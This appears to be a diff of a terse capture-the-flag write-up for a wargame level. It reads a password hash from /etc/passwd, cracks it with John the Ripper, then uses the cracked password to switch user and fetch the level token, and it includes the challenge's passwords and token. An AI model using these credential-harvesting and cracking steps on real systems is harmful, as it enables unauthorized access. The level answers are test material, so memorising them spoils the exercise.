@@ -1,22 +1,39 @@
-🔻 Hack
-➡️ terminal_1
-⬇️ cat /etc/passwd | grep flag01
-👉 42hDRfypTqqnw
-
-⬇️ run new vm
-➡️ terminal_vm
-⬇️ sudo adduser foo
-⬇️ sudo usermod -aG sudo foo
-⬇️ ifcongig
-
-➡️ terminal_2
-⬇️ ssh foo@192.168.0.15
-⬇️ sudo apt-get install john -y
-⬇️ echo '42hDRfypTqqnw' > to_crack
-⬇️ john --show to_crack
-👉 abcdefg
-
-➡️ terminal_1
-⬇️ su flag01 ↪️ abcdefg
-⬇️ getflag
-👉 Check flag.Here is your token : f2av5il02puano7naaf6adaaf
++ ---- 🔻 Hack -------
+|
+|   + ---- terminal_1 -----
+|   |
+|   |   ssh level01@$SNOW_CRASH_IP -p 4242
+|   |   └ x24ti5gi3x0ol2eh4esiuxias
+|   |   cat /etc/passwd | grep flag01
+|   |   👉 42hDRfypTqqnw
+|   |
+|
+|
+|   + ---- run new vm -----
+|   + ---- terminal_vm ----
+|   |
+|   |   sudo adduser foo
+|   |   sudo usermod -aG sudo foo
+|   |   ifcongig
+|   |   👉 192.168.0.15
+|   |
+|
+|
+|   + ---- terminal_2 -----
+|   |
+|   |   ssh foo@192.168.0.15
+|   |   sudo apt-get install john -y
+|   |   echo '42hDRfypTqqnw' > to_crack
+|   |   john --show to_crack
+|   |   👉 abcdefg
+|   |
+|
+|
+|   + ---- terminal_1 -----
+|   |
+|   |   su flag01
+|   |   └ abcdefg
+|   |   getflag
+|   |   👉 Check flag.Here is your token : f2av5il02puano7naaf6adaaf
+|   |
+|
